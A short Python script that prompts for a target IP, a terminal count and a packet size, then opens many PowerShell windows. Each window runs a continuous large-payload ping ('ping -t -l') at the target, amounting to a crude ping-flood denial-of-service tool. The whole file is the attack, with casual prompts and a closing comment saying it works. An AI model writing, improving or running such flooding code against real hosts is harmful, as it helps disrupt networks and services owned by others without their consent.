import subprocess#type: ignore
import time

def open_powershell_instances(num_instances, command):
    for _ in range(num_instances):  # Ensure num_instances is an integer
        subprocess.Popen(["powershell", "-NoExit", "-Command", command], creationflags=subprocess.CREATE_NEW_CONSOLE)

def determs():
    target_ip = input("Target IP: ")

    while True:
        determ_num_instances = input("How many terminals doing: ")
        try:
            num_instances = int(determ_num_instances)  # Convert to integer
            break
        except ValueError:
            print("pe ud nuh uh")
            time.sleep(1)

    while True:
        determ_ping_size = input("Ping size (max is 65500): ")
        try:
            ping_size = int(determ_ping_size)  # Convert to integer
            if ping_size > 65500:
                print("nuh")
                continue
            break
        except ValueError:
            print("goober nuh") 
            time.sleep(1)

    command = f"ping -t -l {ping_size} {target_ip}"
    open_powershell_instances(num_instances, command)  # Pass integer values

determs()
#wow this actually works